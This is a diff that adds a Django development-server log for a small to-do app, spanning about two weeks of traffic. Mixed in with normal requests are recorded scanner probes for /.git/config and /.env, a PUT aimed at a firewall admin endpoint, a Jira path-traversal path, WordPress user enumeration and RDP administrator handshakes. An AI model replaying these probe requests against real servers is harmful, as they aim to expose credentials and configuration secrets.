@@ -1,0 +1,953 @@
+Watching for file changes with StatReloader
+Performing system checks...
+
+System check identified some issues:
+
+WARNINGS:
+todos.Todo: (models.W042) Auto-created primary key used when not defining a primary key type, by default 'django.db.models.AutoField'.
+	HINT: Configure the DEFAULT_AUTO_FIELD setting or the TodosConfig.default_auto_field attribute to point to a subclass of AutoField, e.g. 'django.db.models.BigAutoField'.
+
+System check identified 1 issue (0 silenced).
+November 07, 2022 - 18:52:45
+Django version 3.2.12, using settings 'todoApp.settings'
+Starting development server at http://0.0.0.0:8001/
+Quit the server with CONTROL-C.
+[07/Nov/2022 18:53:12] "GET /todos/ HTTP/1.1" 200 3515
+Watching for file changes with StatReloader
+Performing system checks...
+
+System check identified some issues:
+
+WARNINGS:
+todos.Todo: (models.W042) Auto-created primary key used when not defining a primary key type, by default 'django.db.models.AutoField'.
+	HINT: Configure the DEFAULT_AUTO_FIELD setting or the TodosConfig.default_auto_field attribute to point to a subclass of AutoField, e.g. 'django.db.models.BigAutoField'.
+
+System check identified 1 issue (0 silenced).
+November 07, 2022 - 18:54:08
+Django version 3.2.12, using settings 'todoApp.settings'
+Starting development server at http://0.0.0.0:8001/
+Quit the server with CONTROL-C.
+[07/Nov/2022 18:54:21] "POST /todos/add/ HTTP/1.1" 302 0
+[07/Nov/2022 18:54:22] "GET /todos/ HTTP/1.1" 200 4091
+[07/Nov/2022 18:54:28] "GET /todos/22/delete HTTP/1.1" 302 0
+[07/Nov/2022 18:54:28] "GET /todos/ HTTP/1.1" 200 3515
+Watching for file changes with StatReloader
+System check identified some issues:
+
+WARNINGS:
+todos.Todo: (models.W042) Auto-created primary key used when not defining a primary key type, by default 'django.db.models.AutoField'.
+	HINT: Configure the DEFAULT_AUTO_FIELD setting or the TodosConfig.default_auto_field attribute to point to a subclass of AutoField, e.g. 'django.db.models.BigAutoField'.
+
+System check identified 1 issue (0 silenced).
+[07/Nov/2022 22:54:33] "GET /todos/ HTTP/1.1" 200 3515
+[07/Nov/2022 22:54:40] "POST /todos/add/ HTTP/1.1" 302 0
+[07/Nov/2022 22:54:40] "GET /todos/ HTTP/1.1" 200 4096
+[07/Nov/2022 23:49:10] "GET / HTTP/1.0" 302 0
+[08/Nov/2022 01:35:10] "GET / HTTP/1.1" 302 0
+[08/Nov/2022 01:35:11] "GET /todos HTTP/1.1" 301 0
+[08/Nov/2022 01:35:11] "GET /todos/ HTTP/1.1" 200 4096
+Not Found: /favicon.ico
+[08/Nov/2022 01:35:12] "GET /favicon.ico HTTP/1.1" 404 2459
+[08/Nov/2022 09:06:17] "GET / HTTP/1.1" 302 0
+Not Found: /metrics
+[08/Nov/2022 09:06:17] "GET /metrics HTTP/1.1" 404 2447
+Not Found: /.git/config
+[08/Nov/2022 09:06:17] "GET /.git/config HTTP/1.1" 404 2459
+[08/Nov/2022 09:06:17] "GET /todos HTTP/1.1" 301 0
+[08/Nov/2022 09:06:17] "GET /todos/ HTTP/1.1" 200 4096
+[08/Nov/2022 15:33:30] "GET /static/css/style.css HTTP/1.1" 304 0
+[08/Nov/2022 18:07:14] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03"\x7fù\xad\x7fÑÅÏE\x9e\x13St¶3@¡EÕDT\x9fåË\x84}ÞÊ¿s©Ö\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+[08/Nov/2022 18:07:14] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /.git/config
+[08/Nov/2022 22:35:45] "GET / HTTP/1.1" 302 0
+[08/Nov/2022 22:35:45] "GET /.git/config HTTP/1.1" 404 2459
+Not Found: /metrics
+[08/Nov/2022 22:35:45] "GET /metrics HTTP/1.1" 404 2447
+[08/Nov/2022 22:35:46] "GET /todos HTTP/1.1" 301 0
+[08/Nov/2022 22:35:46] "GET /todos/ HTTP/1.1" 200 4096
+[09/Nov/2022 02:10:04] "GET / HTTP/1.1" 302 0
+[09/Nov/2022 06:08:19] "GET / HTTP/1.1" 302 0
+[09/Nov/2022 06:08:19] "GET /todos HTTP/1.1" 301 0
+[09/Nov/2022 06:08:20] "GET /todos/ HTTP/1.1" 200 4096
+[09/Nov/2022 06:09:35] "GET / HTTP/1.1" 302 0
+Not Found: /metrics
+[09/Nov/2022 09:42:51] "GET /metrics HTTP/1.1" 404 2447
+[09/Nov/2022 09:42:51] "GET / HTTP/1.1" 302 0
+Not Found: /.git/config
+[09/Nov/2022 09:42:51] "GET /.git/config HTTP/1.1" 404 2459
+[09/Nov/2022 09:42:51] "GET /todos HTTP/1.1" 301 0
+[09/Nov/2022 09:42:52] "GET /todos/ HTTP/1.1" 200 4096
+[09/Nov/2022 10:00:49] "GET / HTTP/1.1" 302 0
+[09/Nov/2022 12:00:34] code 400, message Bad request version ('À\x14À')
+[09/Nov/2022 12:00:34] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /.git/config
+[09/Nov/2022 18:53:20] "GET / HTTP/1.1" 302 0
+[09/Nov/2022 18:53:20] "GET /.git/config HTTP/1.1" 404 2459
+Not Found: /metrics
+[09/Nov/2022 18:53:20] "GET /metrics HTTP/1.1" 404 2447
+[09/Nov/2022 18:53:20] "GET /todos HTTP/1.1" 301 0
+[09/Nov/2022 18:53:20] "GET /todos/ HTTP/1.1" 200 4096
+[09/Nov/2022 22:00:09,208] - Broken pipe from ('104.152.52.190', 49571)
+
+[10/Nov/2022 06:08:34] "GET / HTTP/1.1" 302 0
+[10/Nov/2022 06:09:03] "GET / HTTP/1.1" 302 0
+[10/Nov/2022 06:09:03] "GET /todos HTTP/1.1" 301 0
+[10/Nov/2022 07:13:04] "HEAD / HTTP/1.0" 302 0
+Not Found: /system_api.php
+[10/Nov/2022 07:13:04] "GET /system_api.php HTTP/1.1" 404 2468
+Not Found: /c/version.js
+[10/Nov/2022 07:13:04] "GET /c/version.js HTTP/1.1" 404 2462
+Not Found: /streaming/clients_live.php
+[10/Nov/2022 07:13:04] "GET /streaming/clients_live.php HTTP/1.1" 404 2504
+Not Found: /stalker_portal/c/version.js
+[10/Nov/2022 07:13:05] "GET /stalker_portal/c/version.js HTTP/1.1" 404 2507
+Not Found: /stream/live.php
+[10/Nov/2022 07:13:05] "GET /stream/live.php HTTP/1.1" 404 2471
+Not Found: /flu/403.html
+[10/Nov/2022 07:13:05] "GET /flu/403.html HTTP/1.1" 404 2462
+[10/Nov/2022 07:13:05] "GET / HTTP/1.1" 302 0
+[10/Nov/2022 07:13:05] "GET /todos HTTP/1.1" 301 0
+[10/Nov/2022 07:13:06] "GET /todos/ HTTP/1.1" 200 4096
+[10/Nov/2022 08:04:41] code 400, message Bad request version ('À\x14À')
+[10/Nov/2022 08:04:41] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[10/Nov/2022 10:18:42] "GET / HTTP/1.1" 302 0
+Not Found: /metrics
+[10/Nov/2022 10:18:42] "GET /metrics HTTP/1.1" 404 2447
+Not Found: /.git/config
+[10/Nov/2022 10:18:42] "GET /.git/config HTTP/1.1" 404 2459
+[10/Nov/2022 10:18:42] "GET /todos HTTP/1.1" 301 0
+[10/Nov/2022 10:18:42] "GET /todos/ HTTP/1.1" 200 4096
+Not Found: /metrics
+[10/Nov/2022 17:26:10] "GET /metrics HTTP/1.1" 404 2447
+[10/Nov/2022 17:26:10] "GET / HTTP/1.1" 302 0
+Not Found: /.git/config
+[10/Nov/2022 17:26:10] "GET /.git/config HTTP/1.1" 404 2459
+[10/Nov/2022 17:26:10] "GET /todos HTTP/1.1" 301 0
+[10/Nov/2022 17:26:11] "GET /todos/ HTTP/1.1" 200 4096
+[11/Nov/2022 02:06:18] "GET / HTTP/1.1" 302 0
+[11/Nov/2022 02:06:18] "GET /todos HTTP/1.1" 301 0
+[11/Nov/2022 02:06:19] "GET /todos/ HTTP/1.1" 200 4096
+[11/Nov/2022 13:04:50] "GET / HTTP/1.1" 302 0
+[11/Nov/2022 13:04:51] "GET /todos HTTP/1.1" 301 0
+[11/Nov/2022 13:04:51] "GET /todos/ HTTP/1.1" 200 4096
+Not Found: /favicon.ico
+[11/Nov/2022 13:04:52] "GET /favicon.ico HTTP/1.1" 404 2459
+[11/Nov/2022 17:42:37] code 400, message Bad request version ('À\x14À')
+[11/Nov/2022 17:42:37] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[11/Nov/2022 18:49:03] "GET / HTTP/1.1" 302 0
+[11/Nov/2022 18:49:29] "GET / HTTP/1.1" 302 0
+[11/Nov/2022 18:49:29] "GET /todos HTTP/1.1" 301 0
+Not Found: /metrics
+[11/Nov/2022 22:09:12] "GET /metrics HTTP/1.1" 404 2447
+[11/Nov/2022 22:09:12] "GET / HTTP/1.1" 302 0
+Not Found: /.git/config
+[11/Nov/2022 22:09:12] "GET /.git/config HTTP/1.1" 404 2459
+[11/Nov/2022 22:09:12] "GET /todos HTTP/1.1" 301 0
+[11/Nov/2022 22:09:13] "GET /todos/ HTTP/1.1" 200 4096
+[11/Nov/2022 22:43:55] "GET / HTTP/1.1" 302 0
+[11/Nov/2022 22:43:56] "GET /todos HTTP/1.1" 301 0
+[11/Nov/2022 22:43:56] "GET /todos/ HTTP/1.1" 200 4096
+[11/Nov/2022 23:42:09] "GET /static/css/style.css HTTP/1.1" 200 225
+[12/Nov/2022 07:51:58] "GET / HTTP/1.1" 302 0
+Not Found: /metrics
+[12/Nov/2022 09:19:23] "GET /metrics HTTP/1.1" 404 2447
+Not Found: /.git/config
+[12/Nov/2022 09:19:23] "GET /.git/config HTTP/1.1" 404 2459
+[12/Nov/2022 09:19:23] "GET / HTTP/1.1" 302 0
+[12/Nov/2022 09:19:24] "GET /todos HTTP/1.1" 301 0
+[12/Nov/2022 09:19:24] "GET /todos/ HTTP/1.1" 200 4096
+[12/Nov/2022 10:31:57] "GET / HTTP/1.1" 302 0
+[12/Nov/2022 10:59:50] "GET / HTTP/1.1" 302 0
+[12/Nov/2022 10:59:57] "GET / HTTP/1.1" 302 0
+[12/Nov/2022 10:59:57] "GET /todos HTTP/1.1" 301 0
+[12/Nov/2022 14:13:49] "GET / HTTP/1.0" 302 0
+[12/Nov/2022 14:13:49] "GET / HTTP/1.1" 302 0
+Not Found: /sitemap.xml
+[12/Nov/2022 14:13:50] "GET /sitemap.xml HTTP/1.1" 404 2459
+Not Found: /robots.txt
+[12/Nov/2022 14:13:50] "GET /robots.txt HTTP/1.1" 404 2456
+[12/Nov/2022 14:13:52] "GET /todos HTTP/1.1" 301 0
+Not Found: /sitemap.xml
+[12/Nov/2022 14:13:52] "GET /sitemap.xml HTTP/1.1" 404 2459
+Not Found: /robots.txt
+[12/Nov/2022 14:13:52] "GET /robots.txt HTTP/1.1" 404 2456
+[12/Nov/2022 14:13:54] "GET /todos/ HTTP/1.1" 200 4096
+Not Found: /sitemap.xml
+[12/Nov/2022 14:13:54] "GET /sitemap.xml HTTP/1.1" 404 2459
+Not Found: /robots.txt
+[12/Nov/2022 14:13:55] "GET /robots.txt HTTP/1.1" 404 2456
+[12/Nov/2022 14:54:04] "GET / HTTP/1.1" 302 0
+[12/Nov/2022 14:54:04] "GET /todos HTTP/1.1" 301 0
+[12/Nov/2022 14:54:05] "GET /todos/ HTTP/1.1" 200 4096
+[12/Nov/2022 17:06:09,258] - Broken pipe from ('167.248.133.45', 51520)
+
+[12/Nov/2022 17:06:09] code 400, message Bad request version ('À\x14À')
+[12/Nov/2022 17:06:09] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[12/Nov/2022 17:06:10] "GET / HTTP/1.1" 302 0
+[12/Nov/2022 17:06:10,814] - Broken pipe from ('167.248.133.45', 49836)
+
+[12/Nov/2022 17:06:10] "GET / HTTP/1.1" 302 0
+[12/Nov/2022 17:06:11] code 505, message Invalid HTTP version (2.0)
+[12/Nov/2022 17:06:11] "PRI * HTTP/2.0" 505 -
+[12/Nov/2022 17:06:11] "GET /todos HTTP/1.1" 301 0
+[12/Nov/2022 17:06:12] code 505, message Invalid HTTP version (2.0)
+[12/Nov/2022 17:06:12] "PRI * HTTP/2.0" 505 -
+[12/Nov/2022 17:06:12] "GET /todos/ HTTP/1.1" 200 4096
+[12/Nov/2022 17:06:12] code 505, message Invalid HTTP version (2.0)
+[12/Nov/2022 17:06:12] "PRI * HTTP/2.0" 505 -
+Not Found: /favicon.ico
+[12/Nov/2022 17:06:13] "GET /favicon.ico HTTP/1.1" 404 2459
+[12/Nov/2022 17:44:07] code 400, message Bad request version ('À\x14À')
+[12/Nov/2022 17:44:07] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[12/Nov/2022 19:43:44] "GET / HTTP/1.1" 302 0
+[13/Nov/2022 00:53:16] "GET / HTTP/1.1" 302 0
+Not Found: /metrics
+[13/Nov/2022 00:53:16] "GET /metrics HTTP/1.1" 404 2447
+Not Found: /.git/config
+[13/Nov/2022 00:53:16] "GET /.git/config HTTP/1.1" 404 2459
+[13/Nov/2022 00:53:16] "GET /todos HTTP/1.1" 301 0
+[13/Nov/2022 00:53:17] "GET /todos/ HTTP/1.1" 200 4096
+[13/Nov/2022 12:14:52] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03°\x98Ó\x90ð}\x8a71õ¨ý`r£èº^*\x05\x9bX\x1aÖ\x9bV\x14Æì¯Y&\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+[13/Nov/2022 12:14:52] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /metrics
+[13/Nov/2022 12:21:41] "GET /metrics HTTP/1.1" 404 2447
+Not Found: /.git/config
+[13/Nov/2022 12:21:41] "GET /.git/config HTTP/1.1" 404 2459
+[13/Nov/2022 12:21:41] "GET / HTTP/1.1" 302 0
+[13/Nov/2022 12:21:41] "GET /todos HTTP/1.1" 301 0
+[13/Nov/2022 12:21:41] "GET /todos/ HTTP/1.1" 200 4096
+[13/Nov/2022 16:26:03] code 400, message Bad request version ('\x97c\x01Ü®!\x903\x192\x8b»q\x91ó\x9d\x15a\x92')
+[13/Nov/2022 16:26:03] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[13/Nov/2022 16:26:04] "GET / HTTP/1.1" 302 0
+[13/Nov/2022 16:26:04] code 400, message Bad request syntax ('HELP')
+[13/Nov/2022 16:26:04] "HELP" 400 -
+[13/Nov/2022 16:26:04] "GET /?rest_route=/wp/v2/users/ HTTP/1.1" 302 0
+Not Found: /.DS_Store
+[13/Nov/2022 16:26:04] "GET /.DS_Store HTTP/1.1" 404 2453
+[13/Nov/2022 16:26:04] "GET / HTTP/1.1" 302 0
+Not Found: /info.php
+[13/Nov/2022 16:26:04] "GET /info.php HTTP/1.1" 404 2450
+Not Found: /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application
+[13/Nov/2022 16:26:04] "GET /ecp/Current/exporttool/microsoft.exchange.ediscovery.exporttool.application HTTP/1.1" 404 2651
+Not Found: /api/v2/cmdb/system/admin/admin
+[13/Nov/2022 16:26:04] "PUT /api/v2/cmdb/system/admin/admin HTTP/1.1" 404 2516
+Not Found: /debug/default/view
+Not Found: /s/032313e2732313e2231313e233/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties
+[13/Nov/2022 16:26:04] "GET /s/032313e2732313e2231313e233/_/;/META-INF/maven/com.atlassian.jira/jira-webapp-dist/pom.properties HTTP/1.1" 404 2722
+[13/Nov/2022 16:26:04] "GET /debug/default/view?panel=config HTTP/1.1" 404 2493
+Not Found: /.git/config
+[13/Nov/2022 16:26:04] "GET /.git/config HTTP/1.1" 404 2459
+Not Found: /telescope/requests
+Not Found: /server-status
+[13/Nov/2022 16:26:04] "GET /server-status HTTP/1.1" 404 2465
+[13/Nov/2022 16:26:04] "GET /telescope/requests HTTP/1.1" 404 2480
+Not Found: /.env
+[13/Nov/2022 16:26:04] "GET /.env HTTP/1.1" 404 2438
+Not Found: /config.json
+[13/Nov/2022 16:26:05] "GET /config.json HTTP/1.1" 404 2459
+Not Found: /about
+[13/Nov/2022 16:26:05] "GET /about HTTP/1.1" 404 2441
+Not Found: /api/search
+[13/Nov/2022 16:26:05] "GET /api/search?folderIds=0 HTTP/1.1" 404 2468
+Not Found: /login.action
+[13/Nov/2022 16:26:05] "GET /login.action HTTP/1.1" 404 2462
+Not Found: /v2/_catalog
+[13/Nov/2022 16:26:05] "GET /v2/_catalog HTTP/1.1" 404 2459
+[14/Nov/2022 00:51:07] "GET / HTTP/1.1" 302 0
+[14/Nov/2022 02:05:28] "GET / HTTP/1.1" 302 0
+[14/Nov/2022 02:05:38] code 505, message Invalid HTTP version (2.0)
+[14/Nov/2022 02:05:38] "PRI * HTTP/2.0" 505 -
+[14/Nov/2022 02:05:39] "GET /todos HTTP/1.1" 301 0
+[14/Nov/2022 02:05:40] code 505, message Invalid HTTP version (2.0)
+[14/Nov/2022 02:05:40] "PRI * HTTP/2.0" 505 -
+[14/Nov/2022 02:05:41] "GET /todos/ HTTP/1.1" 200 4096
+[14/Nov/2022 02:05:41] code 505, message Invalid HTTP version (2.0)
+[14/Nov/2022 02:05:41] "PRI * HTTP/2.0" 505 -
+Not Found: /favicon.ico
+[14/Nov/2022 02:05:42] "GET /favicon.ico HTTP/1.1" 404 2459
+[14/Nov/2022 03:24:34] code 400, message Bad request syntax ('\x01\x01æ')
+[14/Nov/2022 03:24:34] "æ" 400 -
+[14/Nov/2022 05:42:47] "GET / HTTP/1.1" 302 0
+Not Found: /metrics
+[14/Nov/2022 05:42:47] "GET /metrics HTTP/1.1" 404 2447
+Not Found: /.git/config
+[14/Nov/2022 05:42:47] "GET /.git/config HTTP/1.1" 404 2459
+[14/Nov/2022 05:42:48] "GET /todos HTTP/1.1" 301 0
+[14/Nov/2022 05:42:48] "GET /todos/ HTTP/1.1" 200 4096
+[14/Nov/2022 09:43:42] code 400, message Bad request syntax ('\x03\x00\x00\x13\x0eà\x00\x00\x00\x00\x00\x01\x00\x08\x00\x02\x00\x00\x00')
+[14/Nov/2022 09:43:42] "  à          " 400 -
+[14/Nov/2022 12:16:29] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x11Uøcp¾®J!óÒ\x8a]P\x8c#m&77d\x7fÖÙÏ»oy©:tS\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+[14/Nov/2022 12:16:29] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[14/Nov/2022 16:44:17] "GET / HTTP/1.1" 302 0
+[14/Nov/2022 16:44:25] "GET / HTTP/1.1" 302 0
+[14/Nov/2022 16:44:25] "GET /todos HTTP/1.1" 301 0
+[14/Nov/2022 19:21:22] "GET / HTTP/1.0" 302 0
+[14/Nov/2022 19:37:45] "GET / HTTP/1.1" 302 0
+[14/Nov/2022 19:37:46] code 400, message Bad request version ('À\x13À')
+[14/Nov/2022 19:37:46] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[14/Nov/2022 19:56:55] "GET / HTTP/1.1" 302 0
+[14/Nov/2022 19:56:55] "GET /todos HTTP/1.1" 301 0
+[14/Nov/2022 19:56:56] "GET /todos/ HTTP/1.1" 200 4096
+[14/Nov/2022 22:16:25] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[14/Nov/2022 22:16:25] "  /*à     Cookie: mstshash=Administr" 400 -
+[14/Nov/2022 23:58:09,975] - Broken pipe from ('104.152.52.104', 48653)
+
+[15/Nov/2022 02:59:56] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[15/Nov/2022 02:59:56] "  /*à     Cookie: mstshash=Administr" 400 -
+[15/Nov/2022 04:55:36] code 400, message Bad request syntax ('\x03\x00\x00\x13\x0eà\x00\x00\x00\x00\x00\x01\x00\x08\x00\x02\x00\x00\x00')
+[15/Nov/2022 04:55:36] "  à          " 400 -
+[15/Nov/2022 10:40:03,478] - Broken pipe from ('162.142.125.212', 53098)
+
+[15/Nov/2022 10:40:03] code 400, message Bad request version ('\x0e\x15¤ü;Ë\x8de)ø\x9d·\x08ì')
+[15/Nov/2022 10:40:03] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[15/Nov/2022 10:40:04] "GET / HTTP/1.1" 302 0
+[15/Nov/2022 10:40:04,977] - Broken pipe from ('162.142.125.212', 33354)
+
+[15/Nov/2022 10:40:05] "GET / HTTP/1.1" 302 0
+[15/Nov/2022 10:40:05] code 505, message Invalid HTTP version (2.0)
+[15/Nov/2022 10:40:05] "PRI * HTTP/2.0" 505 -
+[15/Nov/2022 10:40:05] "GET /todos HTTP/1.1" 301 0
+[15/Nov/2022 10:40:11] "GET /todos/ HTTP/1.1" 200 4096
+[15/Nov/2022 10:40:11] code 505, message Invalid HTTP version (2.0)
+[15/Nov/2022 10:40:11] "PRI * HTTP/2.0" 505 -
+Not Found: /favicon.ico
+[15/Nov/2022 10:40:11] "GET /favicon.ico HTTP/1.1" 404 2459
+[15/Nov/2022 11:17:12] code 400, message Bad request version ('À\x14À')
+[15/Nov/2022 11:17:12] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+Not Found: /.git/config
+[15/Nov/2022 12:18:37] "GET /.git/config HTTP/1.1" 404 2459
+[15/Nov/2022 12:18:37] "GET / HTTP/1.1" 302 0
+Not Found: /metrics
+[15/Nov/2022 12:18:37] "GET /metrics HTTP/1.1" 404 2447
+[15/Nov/2022 12:18:37] "GET /todos HTTP/1.1" 301 0
+[15/Nov/2022 12:18:37] "GET /todos/ HTTP/1.1" 200 4096
+[15/Nov/2022 16:23:21] "GET / HTTP/1.1" 302 0
+[15/Nov/2022 16:23:45] "GET / HTTP/1.1" 302 0
+[15/Nov/2022 16:23:45] "GET /todos HTTP/1.1" 301 0
+[15/Nov/2022 18:54:11] "GET / HTTP/1.1" 302 0
+[16/Nov/2022 04:04:07] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[16/Nov/2022 04:04:07] "  /*à     Cookie: mstshash=Administr" 400 -
+[16/Nov/2022 04:27:13] "GET / HTTP/1.1" 302 0
+Not Found: /metrics
+[16/Nov/2022 04:27:13] "GET /metrics HTTP/1.1" 404 2447
+Not Found: /.git/config
+[16/Nov/2022 04:27:13] "GET /.git/config HTTP/1.1" 404 2459
+[16/Nov/2022 04:27:13] "GET /todos HTTP/1.1" 301 0
+[16/Nov/2022 04:27:13] "GET /todos/ HTTP/1.1" 200 4096
+[16/Nov/2022 05:05:50] code 400, message Bad request syntax ('*1')
+[16/Nov/2022 05:05:50] "*1" 400 -
+[16/Nov/2022 12:29:46] "GET / HTTP/1.1" 302 0
+[16/Nov/2022 12:29:51] "GET / HTTP/1.1" 302 0
+[16/Nov/2022 12:29:51] "GET /todos HTTP/1.1" 301 0
+[16/Nov/2022 13:49:09] code 400, message Bad request version ('À\x14À')
+[16/Nov/2022 13:49:09] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[16/Nov/2022 14:52:20] code 400, message Bad request syntax ('\x03\x00\x00\x13\x0eà\x00\x00\x00\x00\x00\x01\x00\x08\x00\x03\x00\x00\x00')
+[16/Nov/2022 14:52:20] "  à          " 400 -
+[16/Nov/2022 15:42:56] "GET / HTTP/1.1" 302 0
+Not Found: /metrics
+[16/Nov/2022 15:42:56] "GET /metrics HTTP/1.1" 404 2447
+[16/Nov/2022 15:42:56] "GET /todos HTTP/1.1" 301 0
+Not Found: /.git/config
+[16/Nov/2022 15:42:56] "GET /.git/config HTTP/1.1" 404 2459
+[16/Nov/2022 15:42:56] "GET /todos/ HTTP/1.1" 200 4096
+[17/Nov/2022 00:35:05] code 400, message Bad request syntax ('\x01I20100')
+[17/Nov/2022 00:35:05] "I20100" 400 -
+Not Found: /metrics
+[17/Nov/2022 04:39:08] "GET /metrics HTTP/1.1" 404 2447
+[17/Nov/2022 04:39:08] "GET / HTTP/1.1" 302 0
+Not Found: /.git/config
+[17/Nov/2022 04:39:08] "GET /.git/config HTTP/1.1" 404 2459
+[17/Nov/2022 04:39:08] "GET /todos HTTP/1.1" 301 0
+[17/Nov/2022 04:39:09] "GET /todos/ HTTP/1.1" 200 4096
+Not Found: /metrics
+[17/Nov/2022 07:07:37] "GET / HTTP/1.1" 302 0
+[17/Nov/2022 07:07:37] "GET /metrics HTTP/1.1" 404 2447
+Not Found: /.git/config
+[17/Nov/2022 07:07:37] "GET /.git/config HTTP/1.1" 404 2459
+[17/Nov/2022 07:07:37] "GET /todos HTTP/1.1" 301 0
+[17/Nov/2022 07:07:38] "GET /todos/ HTTP/1.1" 200 4096
+[17/Nov/2022 07:44:38] "GET / HTTP/1.1" 302 0
+[17/Nov/2022 11:51:44] "GET / HTTP/1.1" 302 0
+[17/Nov/2022 11:51:53] "GET / HTTP/1.1" 302 0
+[17/Nov/2022 11:51:53] "GET /todos HTTP/1.1" 301 0
+[17/Nov/2022 17:56:50] "HEAD / HTTP/1.0" 302 0
+Not Found: /system_api.php
+[17/Nov/2022 17:56:51] "GET /system_api.php HTTP/1.1" 404 2468
+Not Found: /c/version.js
+[17/Nov/2022 17:56:51] "GET /c/version.js HTTP/1.1" 404 2462
+Not Found: /streaming/clients_live.php
+[17/Nov/2022 17:56:52] "GET /streaming/clients_live.php HTTP/1.1" 404 2504
+Not Found: /stalker_portal/c/version.js
+[17/Nov/2022 17:56:52] "GET /stalker_portal/c/version.js HTTP/1.1" 404 2507
+Not Found: /stream/live.php
+[17/Nov/2022 17:56:53] "GET /stream/live.php HTTP/1.1" 404 2471
+Not Found: /flu/403.html
+[17/Nov/2022 17:56:53] "GET /flu/403.html HTTP/1.1" 404 2462
+[17/Nov/2022 17:56:54] "GET / HTTP/1.1" 302 0
+[17/Nov/2022 17:56:54] "GET /todos HTTP/1.1" 301 0
+[17/Nov/2022 17:56:54] "GET /todos/ HTTP/1.1" 200 4096
+[17/Nov/2022 21:26:09] "GET / HTTP/1.1" 302 0
+Not Found: /metrics
+[17/Nov/2022 21:26:09] "GET /metrics HTTP/1.1" 404 2447
+Not Found: /.git/config
+[17/Nov/2022 21:26:09] "GET /.git/config HTTP/1.1" 404 2459
+[17/Nov/2022 21:26:09] "GET /todos HTTP/1.1" 301 0
+[17/Nov/2022 21:26:10] "GET /todos/ HTTP/1.1" 200 4096
+[17/Nov/2022 21:50:23] code 400, message Bad request version ('À\x14À')
+[17/Nov/2022 21:50:23] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[17/Nov/2022 23:33:20] "GET / HTTP/1.1" 302 0
+Not Found: /todos/favicon.ico
+[17/Nov/2022 23:33:21] "GET /todos/favicon.ico HTTP/1.1" 404 3095
+Not Found: /todos/sitemap.xml
+[17/Nov/2022 23:33:21] "GET /todos/sitemap.xml HTTP/1.1" 404 3095
+Not Found: /todos/robots.txt
+[17/Nov/2022 23:33:21] "GET /todos/robots.txt HTTP/1.1" 404 3092
+[17/Nov/2022 23:34:03] "GET /todos HTTP/1.1" 301 0
+Not Found: /todos/favicon.ico
+[17/Nov/2022 23:34:03] "GET /todos/favicon.ico HTTP/1.1" 404 3095
+Not Found: /todos/robots.txt
+[17/Nov/2022 23:34:04] "GET /todos/robots.txt HTTP/1.1" 404 3092
+Not Found: /todos/sitemap.xml
+[17/Nov/2022 23:34:04] "GET /todos/sitemap.xml HTTP/1.1" 404 3095
+[17/Nov/2022 23:34:43] "GET /todos/ HTTP/1.1" 200 4096
+Not Found: /todos/favicon.ico
+[17/Nov/2022 23:34:43] "GET /todos/favicon.ico HTTP/1.1" 404 3095
+Not Found: /todos/sitemap.xml
+[17/Nov/2022 23:34:56] "GET /todos/sitemap.xml HTTP/1.1" 404 3095
+Not Found: /todos/robots.txt
+[17/Nov/2022 23:34:56] "GET /todos/robots.txt HTTP/1.1" 404 3092
+[18/Nov/2022 03:07:05] code 400, message Bad request version ('F\x07\x00tsXrcsXYs9\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00bbXcsXctst\x00\x00\x00\x00\x00\x00')
+[18/Nov/2022 03:07:05] "   TZ          0I    ¨À )t F tsXrcsXYs9                      bbXcsXctst      " 400 -
+[18/Nov/2022 03:07:05] "GET / HTTP/1.1" 302 0
+[18/Nov/2022 03:07:05] "GET /todos HTTP/1.1" 301 0
+[18/Nov/2022 03:07:05] "GET / HTTP/1.1" 302 0
+[18/Nov/2022 03:07:06] "GET /todos HTTP/1.1" 301 0
+[18/Nov/2022 03:07:06] "GET /todos/ HTTP/1.1" 200 4096
+Not Found: /favicon.ico
+[18/Nov/2022 03:07:06] "GET /favicon.ico HTTP/1.1" 404 2459
+[18/Nov/2022 03:07:06] "GET /todos/ HTTP/1.1" 200 4096
+Not Found: /robots.txt
+[18/Nov/2022 03:07:06] "GET /robots.txt HTTP/1.1" 404 2456
+[18/Nov/2022 05:28:42] "GET / HTTP/1.1" 302 0
+[18/Nov/2022 08:16:52] "GET / HTTP/1.1" 302 0
+[18/Nov/2022 08:17:01] "GET /todos HTTP/1.1" 301 0
+[18/Nov/2022 08:17:08] "GET /todos/ HTTP/1.1" 200 4096
+[18/Nov/2022 18:54:11] "GET / HTTP/1.1" 302 0
+[18/Nov/2022 20:26:38] "GET / HTTP/1.1" 302 0
+[18/Nov/2022 20:26:51] "GET / HTTP/1.1" 302 0
+[18/Nov/2022 20:26:51] "GET /todos HTTP/1.1" 301 0
+Not Found: /.git/config
+[19/Nov/2022 00:07:23] "GET / HTTP/1.1" 302 0
+[19/Nov/2022 00:07:23] "GET /.git/config HTTP/1.1" 404 2459
+Not Found: /metrics
+[19/Nov/2022 00:07:24] "GET /metrics HTTP/1.1" 404 2447
